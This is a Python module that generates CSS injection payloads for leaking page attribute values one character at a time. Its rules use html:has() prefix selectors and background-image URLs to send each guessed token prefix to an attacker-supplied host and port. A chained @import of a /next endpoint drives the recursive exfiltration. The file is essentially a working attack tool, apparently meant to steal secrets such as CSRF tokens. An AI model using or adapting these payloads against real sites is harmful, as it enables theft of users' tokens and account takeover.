import urllib.parse


def generate_payload(hostname, port, data, identifier, selector, client):
    stri = generate_next_import(hostname=hostname, port=port, client=client)
    stri += f'html:has({identifier}[{selector}={repr(data)}]{"".join([f":not({identifier}[{selector}={repr(element)}])" for element in client.elements])}){"".join([":first-child" for i in range(client.counter)])}{{background: url("//{hostname}:{port}/end?num={client.counter}&id={client.id}") !important;}}'
    stri += "".join(
        map(
            lambda x: f'html:has({identifier}[{selector}^={repr(data+x)}]{"".join([f":not({identifier}[{selector}={repr(element)}])" for element in client.elements])}){"".join([":first-child" for i in range(client.counter)])}{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(data+x)}&id={client.id}") !important;}}\n',
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
        )
    )
    return stri


def generate_next_import(hostname, port, client):
    return (
        f"@import url('//{hostname}:{port}/next?num={client.counter}&id={client.id}');"
    )
